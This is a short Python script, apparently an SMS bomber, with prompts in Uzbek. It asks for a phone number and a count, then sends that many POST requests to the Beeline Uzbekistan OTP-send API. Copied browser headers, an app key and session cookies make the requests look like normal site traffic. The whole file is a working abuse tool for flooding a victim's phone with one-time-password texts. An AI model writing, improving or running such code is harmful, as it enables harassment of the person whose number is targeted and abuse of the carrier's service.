import requests

def send_otp_sms(phone_number, num_sms):
    url = f"https://beeline.uz/api/refill/args/auth/998{phone_number}/otp/send"

    headers = {
        "Host": "beeline.uz",
        "content-length": "2",
        "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "content-type": "application/json",
        "access-control-allow-origin": "*",
        "accept": "application/json",
        "access-control-allow-credentials": "true",
        "xappkey": "Gr8M2k5FQkbK",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://beeline.uz",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://beeline.uz/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,uz;q=0.6",
        "cookie": "_gcl_au=1.1.17269678.1709543072; _ga=GA1.1.37194669.1709543073; viewport=medium_mobile; key-cookie-smartbanner-main=1709629474758; key-cookie-subscriber-main-2=1709629474758; key-cookie-smartbanner-second=1709553879428; _ga_N837KGK1RT=GS1.1.1709543072.1.1.1709543097.0.0.0"
    }

    payload = {}

    for _ in range(num_sms):
        response = requests.post(url, headers=headers, json=payload)
        if response.status_code == 200:
            print("SMS yuborildi✅")
        else:
            print("SMS yuborilmadi❌")

def main():
    phone_number = input("Telefon raqamni kiriting: ")
    num_sms = int(input("Nechta SMS yuborasiz: "))

    send_otp_sms(phone_number, num_sms)

if __name__ == "__main__":
    main()
